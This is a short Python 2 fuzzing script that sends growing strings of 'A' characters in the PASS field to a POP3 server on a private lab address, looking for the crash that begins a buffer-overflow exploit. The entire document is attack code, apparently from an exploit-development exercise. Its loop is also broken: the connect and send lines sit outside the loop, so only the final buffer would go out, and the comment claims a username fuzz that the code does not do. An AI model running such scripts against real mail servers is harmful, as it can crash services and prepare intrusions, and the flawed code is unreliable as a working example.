#!/usr/bin/python
import socket

#Create an array of A characters that increases in lenght by 200

buffer=["A"]

counter=100

while len(buffer) <=30:
	buffer.append("A"*counter)
	counter=counter+200

#Script will fuzz the username and password field with increasing bytes until it crashes

for string in buffer:
	print "Fuzzing Pass field with %s bytes" % len(string)
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#Change IP to your windows machine
connect=s.connect(('192.168.72.133',110))
s.recv(1024)
s.send('USER Anowar \r\n')
s.recv(1024)
s.send('PASS ' + string + '\r\n')
s.send('QUIT\r\n')
s.close()